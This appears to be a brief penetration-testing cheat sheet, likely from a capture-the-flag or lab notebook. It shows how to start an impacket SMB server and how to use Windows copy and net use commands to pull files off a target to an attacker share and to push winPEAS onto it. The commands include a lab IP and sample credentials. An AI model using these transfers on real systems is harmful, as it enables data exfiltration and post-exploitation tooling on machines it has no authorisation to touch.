---
tags:
---
# smbserver

Quick SMB server to upload and download files

## Capabilities

```bash
# Setup SMB server
sudo impacket-smbserver -smb2support share $(pwd)
```

Interact with the SMB server from the target's machine

```powershell
# Move file from target to attack box
cp target_file.txt \\$OUR_IP\share\target_file.txt

# Move file from attack box to target
cp \\$OUR_IP\share\winPEASany.exe winPEAS.exe

# Include authentication
copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.82\share\playercounter-1.0-SNAPSHOT.jar

# Include authentication
net use \\10.10.14.82\share /user:mojo password123
net use \\10.10.14.82\share /delete
```
